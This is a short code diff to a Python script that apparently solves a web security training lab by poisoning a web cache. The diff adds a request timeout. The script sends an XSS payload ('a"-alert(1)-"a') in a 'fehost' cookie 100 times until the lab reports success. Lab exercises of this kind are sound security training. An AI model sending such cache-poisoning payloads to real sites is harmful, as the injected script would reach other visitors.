@@ -5,10 +5,9 @@ import requests
 
 def poison_web_cache(url, session):
     for i in range(100):
-        response = session.get(url, cookies={'fehost': 'a"-alert(1)-"a'})
+        response = session.get(url, cookies={'fehost': 'a"-alert(1)-"a'}, timeout=10)
         if "Congratulations, you solved the lab!" in response.text:
             return True
-
 
 
 def main():
